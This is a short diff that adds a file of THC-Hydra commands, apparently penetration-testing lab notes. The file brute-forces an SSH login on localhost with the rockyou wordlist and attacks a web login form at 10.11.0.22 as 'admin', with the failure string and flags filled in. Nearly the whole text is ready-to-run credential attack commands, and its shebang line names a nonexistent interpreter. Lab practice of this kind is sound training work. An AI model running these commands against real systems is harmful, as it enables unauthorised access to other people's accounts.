@@ -1,0 +1,10 @@
+#!/usr/bin/peno
+
+hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+
+#Additional information about the http-form-post module
+hydra http-form-post -U
+
+#Attacking the web form with THC-Hydra
+hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+
